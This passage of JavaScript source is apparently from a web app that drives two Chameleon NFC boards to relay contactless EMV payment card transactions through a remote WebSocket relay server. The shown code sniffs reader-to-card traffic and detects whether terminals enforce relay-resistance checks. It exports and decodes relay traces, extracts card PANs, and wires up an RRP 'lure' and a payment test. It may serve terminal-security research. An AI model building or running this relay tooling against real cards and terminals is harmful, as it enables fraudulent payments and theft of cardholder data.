  let a = f;                                  // strip a leading T=CL I-block PCB to reach the APDU
  if ((pcb & 0xE0) === 0x00 && (pcb & 0x02)) a = f.slice(1);
  if (a.length >= 2 && a[0] === 0x80 && a[1] === 0xEA) return { tag: '80 EA EXCHANGE RELAY RESISTANCE DATA — RRP!', rrp: true };
  if (a.length >= 2 && a[0] === 0x00 && a[1] === 0xA4) return { tag: hex(f).includes('32 50 41 59 2E 53 59 53') ? 'SELECT PPSE' : 'SELECT AID' };
  if (a.length >= 2 && a[0] === 0x80 && a[1] === 0xA8) return { tag: 'GPO' };
  if (a.length >= 2 && a[0] === 0x00 && a[1] === 0xB2) return { tag: 'READ RECORD' };
  if (a.length >= 2 && a[0] === 0x80 && a[1] === 0xCA) return { tag: 'GET DATA' };
  if (pcb === 0x93 || pcb === 0x95 || pcb === 0x97) return { tag: 'anticoll/SELECT' };
  if (pcb === 0xE0 || pcb === 0xE1) return { tag: 'RATS' };
  if ((pcb & 0xF0) === 0xA0 || (pcb & 0xF0) === 0xB0) return { tag: 'R-block' };
  if ((pcb & 0xC0) === 0xC0) return { tag: 'S-block (WTX/DESELECT)' };
  return { tag: '' };
}

let sniffRunning = false;
async function passiveSniff() {
  if (sniffRunning) { sniffRunning = false; log('stopping passive sniff…', 'warn'); return; }
  if (running || rrpTestRunning) { log('stop the current session first', 'warn'); return; }
  const dev = ghost.connected ? ghost : (mole.connected ? mole : null);
  if (!dev) { log('connect a board first (the one you place between the reader and card)', 'err'); return; }
  const who = dev.label.toUpperCase();
  const slot = parseInt($('slot').value, 10) || 1;
  // Each sniff call blocks the device; keep it WELL under the 4s BLE supervision
  // timeout (a 12s block dropped the link) and loop for continuous coverage.
  const WINDOW = 2000;
  sniffRunning = true;
  if ($('sniff-btn')) $('sniff-btn').textContent = 'Stop sniff';
  log(`=== PASSIVE SNIFF on the ${who} board — place it BETWEEN the reader and the card and run the transaction. Looping ${WINDOW / 1000}s windows (reader→card only); click again to stop. ===`, 'ok');
  let total = 0, rrp = false;
  try {
    await dev.setActiveSlot(slot);
    await dev.setSlotTagType(slot, TAG_HF14A_4);
    await dev.setSlotEnable(slot, SENSE_HF, true);
    try { await dev.setAntiColl({ uid: hexToBytes('DEADBEEF'), atqa: hexToBytes('0004'), sak: 0x20, ats: new Uint8Array(0) }); } catch (_) {}
    await dev.changeMode(false);            // emulator/listen mode: NFCT demodulates the field
    dev.setLed(2).catch(() => {});          // blue = sniffing
    while (sniffRunning) {
      let r;
      try { r = await dev.sniff(WINDOW, true); }
      catch (e) { log(`sniff window error: ${e.message || e} — retrying`, 'warn'); await sleep(200); continue; }
      const buf = (r && r.data) ? r.data : new Uint8Array(0);
      let i = 0;
      while (i + 2 <= buf.length) {
        const hdr = (buf[i] << 8) | buf[i + 1]; i += 2;
        const bits = hdr & 0x7fff, nb = Math.ceil(bits / 8);
        if (i + nb > buf.length) break;
        const f = buf.slice(i, i + nb); i += nb;
        total++;
        const lbl = sniffLabel(f, bits);
        if (lbl.rrp && !rrp) { rrp = true; setRrpBadge('enforced'); }
        log(`  sniff ${bits}b ${hex(f).trim()}${lbl.tag ? '   ← ' + lbl.tag : ''}`, lbl.rrp ? 'warn' : undefined);
      }
    }
  } catch (e) {
    log('passive sniff error: ' + e, 'err');
  } finally {
    sniffRunning = false;
    if ($('sniff-btn')) $('sniff-btn').textContent = 'Passive sniff';
    try { await dev.changeMode(true); } catch (_) {}
    dev.setLed(5).catch(() => {});
    log(`=== PASSIVE SNIFF stopped: ${total} reader→card frame(s) total${rrp ? ' — 80 EA SEEN (reader ran RRP)' : (total ? ' — no 80 EA seen' : '')} ===`, 'ok');
  }
}

// ---------------------------------------------------------------------------
// FULL TRACE EXPORT: dump every direction for debugging, time-ordered.
//   ghost RX_LOG (reader->ghost) + ghost TX_LOG (ghost->reader)  [same clock]
//   mole RELAY_LOG (mole->card APDU + card->mole response)        [mole clock]
// ts are app_timer ticks @16384 Hz (ms = ts/16.384). Ghost RX+TX share one clock
// (mergeable); the mole log is a separate clock (aligned by sequence/content).
// RX frame lengths are in BITS (incl CRC); TX frame lengths are in BYTES (pre-CRC).
function parseFrameLog(d, lenIsBits) {
  if (!d || d.length < 4) return [];
  const head = d[1], entries = d[2], bytes = d[3];
  const n = Math.min(d[0], entries);
  const tsBase = 4 + entries * (1 + bytes);
  const out = [];
  for (let k = 0; k < n; k++) {
    const idx = (head - n + k + entries) % entries;
    const off = 4 + idx * (1 + bytes);
    const raw = d[off];
    const nb = Math.min(lenIsBits ? Math.round(raw / 8) : raw, bytes);
    const frame = d.slice(off + 1, off + 1 + nb);
    const t = (d[tsBase + idx * 4] | (d[tsBase + idx * 4 + 1] << 8) | (d[tsBase + idx * 4 + 2] << 16) | (d[tsBase + idx * 4 + 3] << 24)) >>> 0;
    out.push({ ts: t, ms: +(t / 16.384).toFixed(1), hex: hex(frame).trim() });
  }
  return out;
}
function parseRelayLog(d) {
  if (!d || d.length < 5) return [];
  const head = d[1], entries = d[2], cw = d[3], rw = d[4];
  const esz = 1 + cw + 1 + rw + 1;
  const tsBase = 5 + entries * esz;
  const n = Math.min(d[0], entries);
  const out = [];
  for (let k = 0; k < n; k++) {
    const idx = (head - n + k + entries) % entries;
    const off = 5 + idx * esz;
    const clen = d[off], cmd = d.slice(off + 1, off + 1 + Math.min(clen, cw));
    const rlen = d[off + 1 + cw], rsp = d.slice(off + 1 + cw + 1, off + 1 + cw + 1 + Math.min(rlen, rw));
    const st = d[off + 1 + cw + 1 + rw];
    const t = (d[tsBase + idx * 4] | (d[tsBase + idx * 4 + 1] << 8) | (d[tsBase + idx * 4 + 2] << 16) | (d[tsBase + idx * 4 + 3] << 24)) >>> 0;
    out.push({ ts: t, ms: +(t / 16.384).toFixed(1), apdu: hex(cmd).trim(), resp: hex(rsp).trim(), st });
  }
  return out;
}
async function exportTrace() {
  if (!ghost.connected && !mole.connected) { log('connect a board first', 'err'); return; }
  if (running || rrpTestRunning || sniffRunning) { log('STOP the running session first, then Export trace — an active relay/RRP-test/sniff monopolises the board BLE channel and the log read times out (the ring buffers persist after Stop, so nothing is lost)', 'warn'); return; }
  const trace = {
    exported: new Date().toISOString(), build: BUILD,
    note: 'ts = app_timer ticks @16384Hz (ms=ts/16.384). ghost.frames = reader<->ghost both directions on the ghost clock; mole.exchanges = mole<->card on the mole clock.',
  };
  // Each board independently, so one failing never silently drops the other.
  if (ghost.connected) {
    try {
      const rx = await ghost.sendCmd(CMD.HF14A_4_RX_LOG, u8([0]), 3000);
      const tx = await ghost.sendCmd(CMD.HF14A_4_TX_LOG, u8([0]), 3000);
      const rxf = parseFrameLog(rx.data, true).map(f => ({ ...f, dir: 'reader->ghost' }));
      const txf = parseFrameLog(tx.data, false).map(f => ({ ...f, dir: 'ghost->reader' }));
      trace.ghost = { frames: [...rxf, ...txf].sort((a, b) => a.ts - b.ts) };
      log(`trace: ghost ${rxf.length} RX + ${txf.length} TX frames`, 'ok');
    } catch (e) { log('trace: ghost read FAILED: ' + (e.message || e), 'err'); trace.ghostError = String(e); }
  } else { log('trace: ghost NOT connected — no reader↔ghost side', 'warn'); }
  if (mole.connected) {
    try {
      const rl = await mole.sendCmd(CMD.HF14A_4_RELAY_LOG, u8([0]), 3000);
      trace.mole = { exchanges: parseRelayLog(rl.data).sort((a, b) => a.ts - b.ts) };
      log(`trace: mole ${trace.mole.exchanges.length} APDU exchange(s)`, 'ok');
    } catch (e) { log('trace: mole read FAILED: ' + (e.message || e), 'err'); trace.moleError = String(e); }
  } else { log('trace: mole NOT connected — no card↔mole side (connect the mole for a full relay trace)', 'warn'); }
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const blob = new Blob([JSON.stringify(trace, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `chameleon-trace-${stamp}.json`;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 2000);
  const gc = trace.ghost ? trace.ghost.frames.length : 0, mc = trace.mole ? trace.mole.exchanges.length : 0;
  log(`exported full trace: ${gc} ghost frames (reader↔ghost), ${mc} mole exchanges (mole↔card) → ${a.download}`, 'ok');
}

// ---------------------------------------------------------------------------
// Trace DECODER: read a fresh capture and print a human-readable annotated
// transcript to the log (PCB type + APDU name), instead of raw hex JSON.
function apduName(a) {
  if (!a || a.length < 1) return '';
  const c = a[0], i = a.length >= 2 ? a[1] : -1;
  if (c === 0x00 && i === 0xA4) return hex(a).includes('32 50 41 59 2E 53 59 53') ? 'SELECT PPSE' : 'SELECT AID ' + (a.length > 5 ? hxc(a.slice(5, 5 + a[4])) : '');
  if (c === 0x80 && i === 0xA8) return 'GPO';
  if (c === 0x00 && i === 0xB2) return `READ RECORD sfi${a[3] >> 3} rec${a[2]}`;
  if (c === 0x80 && i === 0xCA) return 'GET DATA ' + hxc(a.slice(2, 4));
  if (c === 0x80 && i === 0xEA) return 'EXCHANGE RELAY RESISTANCE DATA (RRP)';
  if (c === 0x80 && i === 0xAE) return 'GENERATE AC';
  if (c === 0x6F) return 'resp FCI';
  if (c === 0x77) return 'resp GPO (AIP/AFL)';
  if (c === 0x70) return 'resp record';
  if (c === 0x9F) return 'resp GET DATA';
  if (a.length >= 2) { const sw = ((a[a.length - 2] << 8) | a[a.length - 1]).toString(16).toUpperCase().padStart(4, '0'); if (/^(9000|6[0-9A-F]{3})$/.test(sw)) return 'SW ' + sw; }
  return '';
}
function decodeFrame(b) {
  if (!b || !b.length) return '(empty)';
  const p = b[0];
  if (p === 0x26) return 'REQA';
  if (p === 0x52) return 'WUPA';
  if (p === 0x93 || p === 0x95 || p === 0x97) return `anticoll/SELECT CL${(p - 0x91) / 2}`;
  if (p === 0xE0 || p === 0xE1) return 'RATS';
  if (p === 0x50 && b[1] === 0x00) return 'HLTA';
  if ((p & 0xE0) === 0x00 && (p & 0x02)) { let off = 1; if (p & 0x08) off++; if (p & 0x04) off++; const a = b.slice(off, Math.max(off, b.length - 2)); return `I(${p & 1}${p & 0x10 ? ',chain' : ''}) ${apduName(a)}`.trim(); }
  if ((p & 0xE6) === 0xA2) return `R(${p & 0x10 ? 'NAK' : 'ACK'}) blk${p & 1}`;
  if ((p & 0xC0) === 0xC0) { if ((p & 0xF0) === 0xF0) return 'S(WTX)'; if ((p & 0xF7) === 0xC2) return 'S(DESELECT)'; if ((p & 0xF0) === 0xD0) return 'S(PPS)'; return `S 0x${p.toString(16)}`; }
  return `0x${p.toString(16).padStart(2, '0')}`;
}
// Card identity from a card response (for the "card changed" marker): PAN (tag 5A),
// else track2 PAN (tag 57), else AIP (tag 82).
function traceCardKey(b) {
  if (!b || b.length < 3) return null;
  const pan = tlvFind(b, 0x5A)[0]; if (pan) return 'PAN ' + hxc(pan);
  const t2 = tlvFind(b, 0x57)[0]; if (t2 && t2.length >= 8) return 'PAN ' + hxc(t2).slice(0, 16);
  const aip = tlvFind(b, 0x82)[0]; if (aip) return 'AIP ' + hxc(aip);
  return null;
}
// Strip a leading T=CL I-block PCB (+CID/NAD) and trailing CRC to reach the APDU.
function traceIblockPayload(b) {
  if (!b.length) return b;
  const p = b[0];
  if ((p & 0xE0) === 0 && (p & 0x02)) { let o = 1; if (p & 0x08) o++; if (p & 0x04) o++; return b.slice(o, Math.max(o, b.length - 2)); }
  return b;
}
async function decodeTrace() {
  if (running || rrpTestRunning || sniffRunning) { log('stop the running session first, then Decode trace', 'warn'); return; }
  if (!ghost.connected && !mole.connected) { log('connect a board first', 'err'); return; }
  const bytesOf = (h) => (!h || h === '(empty)') ? [] : h.split(' ').map(x => parseInt(x, 16));
  const lines = [`DECODED TRACE  ${new Date().toISOString()}  (build ${BUILD})`];
  const put = s => lines.push(s);
  if (ghost.connected) {
    try {
      const rx = await ghost.sendCmd(CMD.HF14A_4_RX_LOG, u8([0]), 3000);
      const tx = await ghost.sendCmd(CMD.HF14A_4_TX_LOG, u8([0]), 3000);
      const frames = [
        ...parseFrameLog(rx.data, true).map(f => ({ ...f, dir: 'R->G' })),
        ...parseFrameLog(tx.data, false).map(f => ({ ...f, dir: 'G->R' })),
      ].sort((a, b) => a.ts - b.ts);
      put(''); put(`== reader<->ghost : ${frames.length} frames ==`);
      let last = null;
      for (const f of frames) {
        const b = bytesOf(f.hex);
        const k = traceCardKey(traceIblockPayload(b));
        if (k && k !== last) { if (last !== null) put(`  ---- card changed -> ${k} ----`); last = k; }
        put(`  ${String(f.ms.toFixed(0)).padStart(8)}ms ${f.dir} ${decodeFrame(b)}`);
      }
    } catch (e) { put('ghost decode failed: ' + (e.message || e)); }
  }
  if (mole.connected) {
    try {
      const rl = await mole.sendCmd(CMD.HF14A_4_RELAY_LOG, u8([0]), 3000);
      const ex = parseRelayLog(rl.data).sort((a, b) => a.ts - b.ts);
      put(''); put(`== mole<->card : ${ex.length} exchanges ==`);
      let last = null;
      for (const e of ex) {
        const k = traceCardKey(bytesOf(e.resp));
        if (k && k !== last) { if (last !== null) put(`  ---- card changed -> ${k} ----`); last = k; }
        put(`  ${String(e.ms.toFixed(0)).padStart(8)}ms  ${apduName(bytesOf(e.apdu)) || e.apdu}  ->  ${apduName(bytesOf(e.resp)) || e.resp || '(empty)'}${e.st ? '  st=' + e.st : ''}`);
      }
    } catch (e) { put('mole decode failed: ' + (e.message || e)); }
  }
  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
  const url = URL.createObjectURL(blob), a = document.createElement('a');
  a.href = url; a.download = `decoded-trace-${new Date().toISOString().slice(0, 19).replace(/[:.]/g, '-')}.txt`;
  document.body.appendChild(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(url), 2000);
  log(`decoded trace downloaded: ${lines.length - 1} lines → ${a.download}`, 'ok');
}

// Readers → CSV (tested-terminals dataset).
function exportReadersCsv() {
  const list = loadReaders();
  if (!list.length) { log('no readers stored yet', 'warn'); return; }
  const q = s => `"${String(s == null ? '' : s).replace(/"/g, '""')}"`;
  const rows = ['name,rrp,fingerprint,terminal,seen,first,last'];
  for (const r of list) rows.push([q(r.name), q(rrpLabel(r.rrp)), q(r.fp || ''), q(r.fp ? readerSummary(unhexTags(r.tags)) : ''), r.seen, q(new Date(r.first).toISOString()), q(new Date(r.last).toISOString())].join(','));
  const blob = new Blob([rows.join('\n')], { type: 'text/csv' });
  const url = URL.createObjectURL(blob), a = document.createElement('a');
  a.href = url; a.download = `readers-${new Date().toISOString().slice(0, 19).replace(/[:.]/g, '-')}.csv`;
  document.body.appendChild(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(url), 2000);
  log(`exported ${list.length} reader(s) → ${a.download}`, 'ok');
}

window.addEventListener('DOMContentLoaded', () => {
  if (!navigator.bluetooth) {
    log('Web Bluetooth is not available in this browser. Use desktop or Android Chrome/Edge (not iOS Safari).', 'err');
    $('ghost-btn').disabled = true; $('mole-btn').disabled = true;
  }
  $('ghost-btn').onclick = () => toggleConnect('ghost');
  $('mole-btn').onclick = () => toggleConnect('mole');
  $('start').onclick = startRelay;
  $('stop').onclick = stopRelay;
  $('clear').onclick = () => { $('log').innerHTML = ''; };
  $('rxdump-btn').onclick = dumpRxLog;
  $('clearcache-btn').onclick = clearCache;
  if ($('rrp-btn')) $('rrp-btn').onclick = checkRRP;
  if ($('lure-btn')) $('lure-btn').onclick = buildRrpLure;
  if ($('lure-save-btn')) $('lure-save-btn').onclick = saveLureToSlot;
  if ($('rrptest-btn')) $('rrptest-btn').onclick = rrpPosTest;
  if ($('sniff-btn')) $('sniff-btn').onclick = passiveSniff;
  if ($('genac-btn')) $('genac-btn').onclick = testPayment;
  if ($('cachesafe-btn')) $('cachesafe-btn').onclick = testCacheSafety;
  if ($('readers-btn')) $('readers-btn').onclick = toggleReaders;
  if ($('export-btn')) $('export-btn').onclick = exportData;
  if ($('trace-btn')) $('trace-btn').onclick = exportTrace;
  if ($('decode-btn')) $('decode-btn').onclick = decodeTrace;
  // Refresh battery % on connected boards every 60s, but only when idle (an active
  // relay/test/sniff monopolises the BLE channel, so a battery read would collide).
  setInterval(async () => {
    if (running || rrpTestRunning || sniffRunning) return;
    for (const [who, dev] of [['ghost', ghost], ['mole', mole]]) {
      if (dev.connected) { await dev.readBattery(); await dev.readRssi(); setDevUI(who, dev); }
    }
  }, 60000);
  if ($('readers-panel')) $('readers-panel').addEventListener('click', e => {
    const b = e.target.closest('button'); if (!b) return;
    if (b.classList.contains('rdr-rename')) renameReader(b.dataset.id);
    else if (b.classList.contains('rdr-del')) deleteReader(b.dataset.id);
    else if (b.classList.contains('rdr-csv')) exportReadersCsv();
  });
  $('link-btn').onclick = toggleLink;
  $('wake-btn').onclick = wakeServer;
  document.querySelectorAll('input[name=role]').forEach(r => r.addEventListener('change', applyRole));
  // default the server URL: our Render relay when hosted (https), ws://localhost for local dev
  $('server-url').value = (location.protocol === 'https:')
    ? 'wss://chameleon-relay-web.onrender.com' : 'ws://localhost:8080';
  setDevUI('ghost', ghost); setDevUI('mole', mole);
  applyRole();
  log(`ready (build ${BUILD}). Pick a role: Local (both boards here) · Mole (card side) · Ghost (terminal side).`);
});
